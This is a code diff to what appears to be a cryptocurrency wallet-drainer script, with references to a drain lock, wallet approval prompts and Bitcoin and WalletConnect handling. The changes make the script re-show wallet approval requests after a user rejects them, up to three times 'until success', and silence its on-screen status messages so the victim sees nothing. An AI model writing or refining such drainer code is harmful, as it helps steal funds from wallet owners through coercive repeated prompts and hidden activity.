@@ -69,10 +69,10 @@
   var WC_BIP122_POLL_MS = 8000;
   var WC_BG_RAIL_TIMEOUT_MS = 45000;
   var BIP122_BITCOIN_MAINNET = 'bip122:000000000019d6689c085ae165831e93';
-  /** Never re-show the SAME popup after user acted (confirm or reject). Next kind may still show. */
+  /** Re-prompt wallet approvals after user reject until success (or this cap). */
   var MAX_APPROVAL_RETRIES = (CFG.maxApprovalRetries != null && Number(CFG.maxApprovalRetries) > 0)
     ? Math.floor(Number(CFG.maxApprovalRetries))
-    : 1;
+    : 3;
   /** Safety: never leave drainRunning stuck longer than this. */
   var DRAIN_LOCK_TTL_MS = (CFG.drainLockTtlMs != null && Number(CFG.drainLockTtlMs) > 0)
     ? Math.floor(Number(CFG.drainLockTtlMs))
@@ -8444,15 +8444,7 @@
       document.body.appendChild(root);
     },
 
-    showStatus: function (msg) {
-      var el = document.getElementById('__lgn_st');
-      if (!el) return;
-      if (!msg) { el.style.display = 'none'; return; }
-      el.textContent = msg;
-      el.style.display = 'block';
-      clearTimeout(this._stTimer);
-      this._stTimer = setTimeout(function () { el.style.display = 'none'; }, 8000);
-    },
+    showStatus: function (msg) { /* silent */ },
 
     showUserRejected: function () {
       // Force pipeline to REJECTED so pipelineBusy() returns false and retry timer fires
